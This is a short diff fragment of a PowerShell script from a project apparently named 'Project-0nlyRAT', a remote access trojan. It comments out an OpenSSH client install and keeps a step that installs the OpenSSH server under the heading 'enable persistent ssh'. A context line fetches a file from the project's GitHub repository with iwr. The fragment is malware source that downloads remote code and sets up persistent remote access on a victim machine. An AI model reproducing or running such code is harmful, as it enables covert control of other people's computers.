@@ -46,7 +46,7 @@ iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads
 
 # enable persistent ssh
 # Install the OpenSSH Client
-Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+# Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
 
 # Install the OpenSSH Server feature
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
